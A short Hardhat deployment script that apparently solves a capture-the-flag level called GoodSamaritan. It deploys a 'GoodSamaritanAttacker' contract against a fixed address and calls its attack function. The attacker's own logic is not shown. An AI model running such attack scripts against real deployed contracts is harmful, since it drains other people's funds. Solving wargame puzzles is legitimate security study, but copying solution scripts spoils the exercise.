import { ethers } from "hardhat";

async function main() {
  const goodSamaritan = await ethers.getContractAt("GoodSamaritan", "0x045F4fB70Ce37d7Cee20Cd48A8369EcC270132eC");

  const Attacker = await ethers.getContractFactory("GoodSamaritanAttacker");
  const attacker = await Attacker.deploy(goodSamaritan.address);
  console.log("attacker deployed at", attacker.address);

  const tx = await attacker.attack();
  await tx.wait(1);
  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
